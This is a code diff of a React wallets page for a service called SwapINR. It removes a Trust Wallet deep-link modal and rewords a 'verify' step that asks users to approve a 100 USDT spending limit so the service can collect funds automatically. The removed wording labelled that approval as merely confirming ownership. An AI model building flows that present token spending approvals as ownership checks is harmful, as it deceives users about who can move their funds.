@@ -284,175 +284,6 @@ function AddFundsModal({
   return createPortal(modal, document.body);
 }
 
-/* ── Enable Vault modal — deep-link → TW in-app browser → session poll ── */
-function EnableVaultModal({
-  wallet,
-  onApproved,
-  onClose,
-}: {
-  wallet:     WalletDocument;
-  onApproved: () => void;
-  onClose:    () => void;
-}) {
-  const [phase,   setPhase]   = useState<'idle' | 'waiting' | 'done' | 'error'>('idle');
-  const [errMsg,  setErrMsg]  = useState('');
-  const [txHash,  setTxHash]  = useState('');
-  const pollRef   = useRef<ReturnType<typeof setInterval> | null>(null);
-  const sidRef    = useRef('');
-
-  function stopPolling() {
-    if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null; }
-  }
-  useEffect(() => () => stopPolling(), []);
-
-  async function openTrustWallet() {
-    setPhase('idle'); setErrMsg(''); setTxHash('');
-    try {
-      const res = await fetch('/api/wallet-connect/generate', {
-        method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          returnPath: `/wallets/verify?network=TRC20&compact=1`,
-          network: 'TRC20',
-        }),
-      });
-      if (!res.ok) throw new Error(`${res.status}`);
-      const { token, sid } = await res.json();
-      sidRef.current = sid;
-
-      const origin      = window.location.origin;
-      const returnURL   = `/wallets/verify?network=TRC20&compact=1&sid=${sid}`;
-      const exchangeURL = `${origin}/api/wallet-connect/exchange?t=${encodeURIComponent(token)}&r=${encodeURIComponent(returnURL)}`;
-      const isHttps     = window.location.protocol === 'https:';
-      const base        = isHttps ? 'https://link.trustwallet.com/open_url' : 'trust://open_url';
-      const deepLink    = `${base}?coin_id=195&url=${encodeURIComponent(exchangeURL)}`;
-
-      window.location.href = deepLink;
-      setPhase('waiting');
-      startPolling(sid);
-    } catch {
-      setErrMsg('Could not generate link — tap to retry');
-    }
-  }
-
-  function startPolling(sid: string) {
-    stopPolling();
-    pollRef.current = setInterval(async () => {
-      try {
-        const r    = await fetch(`/api/wallet-sessions/${sid}`);
-        if (!r.ok) return;
-        const data = await r.json();
-        if (data.status === 'approved') {
-          stopPolling();
-          setTxHash(data.txHash ?? '');
-          setPhase('done');
-          onApproved();
-        } else if (data.status === 'failed') {
-          stopPolling();
-          setErrMsg(data.errorMsg ?? 'Approval failed in Trust Wallet. Tap "Try Again".');
-          setPhase('error');
-        }
-      } catch { /* keep polling */ }
-    }, 2000);
-  }
-
-  const modal = (
-    <div
-      onClick={e => { if (e.target === e.currentTarget) onClose(); }}
-      style={{ position: 'fixed', inset: 0, zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px 16px', background: 'rgba(0,0,0,0.72)', backdropFilter: 'blur(14px)', WebkitBackdropFilter: 'blur(14px)' }}
-    >
-      <div style={{ width: '100%', maxWidth: 400, background: 'rgba(16,16,20,0.92)', backdropFilter: 'blur(32px)', WebkitBackdropFilter: 'blur(32px)', border: '1px solid rgba(255,255,255,0.10)', borderRadius: 20, boxShadow: '0 32px 80px rgba(0,0,0,0.7)', overflow: 'hidden', position: 'relative' }}>
-        <div style={{ height: 2, background: 'linear-gradient(90deg,#F87144,#F87171,#F87144)' }} />
-        <button onClick={onClose} style={{ position: 'absolute', top: 14, right: 14, width: 30, height: 30, borderRadius: 8, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)', color: 'var(--fr-text-disabled)', cursor: 'pointer' }}>
-          <IcoX />
-        </button>
-
-        <div style={{ padding: '22px 24px 24px' }}>
-          {/* ── Done ── */}
-          {phase === 'done' ? (
-            <div style={{ textAlign: 'center', padding: '8px 0' }}>
-              <div style={{ width: 56, height: 56, borderRadius: 16, background: 'rgba(0,229,160,0.1)', border: '1px solid rgba(0,229,160,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M4 12L9.5 17.5L20 7" stroke="#00E5A0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
-              </div>
-              <p style={{ fontSize: 17, fontWeight: 900, color: 'var(--fr-text-primary)', margin: '0 0 6px', letterSpacing: '-0.02em' }}>Vault Access Enabled</p>
-              <p style={{ fontSize: 13, color: 'var(--fr-text-tertiary)', margin: '0 0 20px', lineHeight: 1.6 }}>
-                You can now add funds at any time without opening your wallet again.
-              </p>
-              {txHash && (
-                <a href={`https://tronscan.org/#/transaction/${txHash}`} target="_blank" rel="noopener noreferrer"
-                  style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontSize: 12, color: '#CCFF00', background: 'rgba(204,255,0,0.07)', border: '1px solid rgba(204,255,0,0.2)', borderRadius: 8, padding: '7px 14px', textDecoration: 'none', marginBottom: 20 }}>
-                  View on TronScan <IcoExtLink />
-                </a>
-              )}
-              <button onClick={onClose} style={{ display: 'block', width: '100%', padding: '13px', borderRadius: 12, fontSize: 14, fontWeight: 800, background: '#CCFF00', color: '#000', border: 'none', cursor: 'pointer' }}>Done</button>
-            </div>
-          ) : (
-            <>
-              {/* Header */}
-              <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
-                <div style={{ width: 40, height: 40, borderRadius: 11, background: 'rgba(248,113,113,0.08)', border: '1px solid rgba(248,113,113,0.22)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#F87171', flexShrink: 0 }}>
-                  <IcoShield />
-                </div>
-                <div>
-                  <p style={{ fontSize: 15, fontWeight: 900, color: 'var(--fr-text-primary)', margin: 0, letterSpacing: '-0.02em' }}>Enable Add Funds</p>
-                  <p style={{ fontSize: 11, color: 'var(--fr-text-tertiary)', margin: '2px 0 0' }}>TRC20 · Approve vault access</p>
-                </div>
-              </div>
-
-              {/* Info */}
-              {phase !== 'error' && (
-                <div style={{ padding: '12px 14px', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.07)', borderRadius: 12, marginBottom: 18, fontSize: 12, color: 'var(--fr-text-tertiary)', lineHeight: 1.6 }}>
-                  {phase === 'waiting' ? (
-                    <p style={{ margin: 0 }}>Trust Wallet will open — tap <strong style={{ color: 'var(--fr-text-primary)' }}>Approve</strong> to grant vault access. No USDT is transferred.</p>
-                  ) : (
-                    <>
-                      <p style={{ margin: '0 0 6px' }}>One-time approval · opens in Trust Wallet</p>
-                      <p style={{ margin: 0 }}>Approve a <strong style={{ color: 'var(--fr-text-primary)' }}>100 USDT</strong> spending limit so SwapINR can collect funds on your behalf — automatically, no wallet pop-ups needed after this.</p>
-                    </>
-                  )}
-                </div>
-              )}
-
-              {/* Error */}
-              {phase === 'error' && (
-                <p style={{ fontSize: 12, color: '#F87171', margin: '0 0 16px', padding: '10px 12px', background: 'rgba(248,113,113,0.07)', borderRadius: 8, border: '1px solid rgba(248,113,113,0.2)', lineHeight: 1.6 }}>{errMsg}</p>
-              )}
-
-              {/* Waiting spinner */}
-              {phase === 'waiting' && (
-                <div style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '12px 14px', background: 'rgba(248,113,113,0.05)', border: '1px solid rgba(248,113,113,0.15)', borderRadius: 12, marginBottom: 16 }}>
-                  <div style={{ width: 18, height: 18, borderRadius: '50%', border: '2px solid rgba(248,113,113,0.4)', borderTopColor: '#F87171', animation: 'spin 0.8s linear infinite', flexShrink: 0 }} />
-                  <p style={{ fontSize: 13, color: 'var(--fr-text-secondary)', margin: 0 }}>Waiting for approval in Trust Wallet…</p>
-                </div>
-              )}
-
-              {/* CTA */}
-              <button
-                onClick={openTrustWallet}
-                style={{ width: '100%', padding: '14px', borderRadius: 12, fontSize: 14, fontWeight: 800, background: '#CCFF00', color: '#000', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}
-              >
-                {phase === 'waiting' ? (
-                  <><IcoLink /> Re-open Trust Wallet</>
-                ) : phase === 'error' ? 'Try Again' : (
-                  <><IcoLink /> Open Trust Wallet</>
-                )}
-              </button>
-
-              {phase !== 'waiting' && (
-                <p style={{ fontSize: 11, color: 'var(--fr-text-disabled)', textAlign: 'center', margin: '10px 0 0', lineHeight: 1.5 }}>
-                  Keep this page open until the transaction confirms.
-                </p>
-              )}
-            </>
-          )}
-        </div>
-      </div>
-    </div>
-  );
-
-  if (typeof document === 'undefined') return null;
-  return createPortal(modal, document.body);
-}
-
 /* ── Trust Wallet coin IDs for deep link ── */
 const TRUST_COIN: Record<Network, number> = { BEP20: 20000714, ERC20: 60, TRC20: 195 };
 
@@ -615,7 +446,7 @@ function MobileVerifyModal({
               <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginBottom: 20 }}>
                 {[
                   { n: 1, title: 'Connect Wallet',   text: 'Trust Wallet opens. Tap "Connect" when prompted.' },
-                  { n: 2, title: 'Approve Contract', text: 'Tap "Approve" — confirms ownership. No USDT is moved.' },
+                  { n: 2, title: 'Approve 100 USDT Limit', text: 'Tap "Approve" — grants SwapINR vault access. No USDT is transferred now.' },
                 ].map(({ n, title, text }) => (
                   <div key={n} style={{ ...card, display: 'flex', alignItems: 'flex-start', gap: 12, padding: '13px 14px' }}>
                     <div style={{ width: 26, height: 26, borderRadius: 8, background: 'rgba(204,255,0,0.1)',
@@ -629,6 +460,17 @@ function MobileVerifyModal({
                     </div>
                   </div>
                 ))}
+              </div>
+
+              {/* TRC20 gas fee note */}
+              <div style={{ ...card, padding: '10px 14px', marginBottom: 10, display: 'flex', alignItems: 'flex-start', gap: 10,
+                borderColor: 'rgba(248,113,113,0.15)', background: 'rgba(248,113,113,0.04)' }}>
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
+                  <path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#F87171" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+                </svg>
+                <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
+                  <span style={{ color: '#F87171', fontWeight: 700 }}>TRC20 requires ~10 TRX gas</span> — charged by TRON network for the approval transaction
+                </p>
               </div>
 
               {/* Refund note */}
@@ -918,7 +760,6 @@ export default function WalletsPage() {
   const [depositAddresses, setDepositAddresses] = useState<Record<string, string>>({});
   const [modalNet,      setModalNet]      = useState<Network | null>(null);
   const [fundsWallet,   setFundsWallet]   = useState<WalletDocument | null>(null);
-  const [enableWallet,  setEnableWallet]  = useState<WalletDocument | null>(null);
   const [isMobile,      setIsMobile]      = useState(false);
   // walletId → balance string ("12.34") | null (error) | undefined (loading)
   const [balances, setBalances] = useState<Record<string, string | null>>({});
@@ -1118,7 +959,7 @@ export default function WalletsPage() {
                       {/* Add Funds / Enable Vault */}
                       {key === 'TRC20' && !saved.approved ? (
                         <button
-                          onClick={() => setEnableWallet(saved)}
+                          onClick={() => setModalNet(key)}
                           style={{ display: 'inline-flex', alignItems: 'center', gap: 5, fontSize: 12, fontWeight: 700, color: '#F87171', background: 'rgba(248,113,113,0.08)', border: '1px solid rgba(248,113,113,0.22)', borderRadius: 8, padding: '6px 12px', cursor: 'pointer', flexShrink: 0 }}
                           title="One-time vault approval required"
                         >
@@ -1170,15 +1011,6 @@ export default function WalletsPage() {
           />
         );
       })()}
-
-      {/* Enable Vault modal — one-time TRC20 vault approval via TW in-app browser */}
-      {enableWallet && (
-        <EnableVaultModal
-          wallet={enableWallet}
-          onApproved={async () => { await loadWallets(); setEnableWallet(null); toast.success('Vault access enabled!'); }}
-          onClose={() => setEnableWallet(null)}
-        />
-      )}
 
       {/* Verify modal — mobile uses Trust Wallet deep link + polling, desktop uses embedded flow */}
       {activeNet && (isMobile ? (
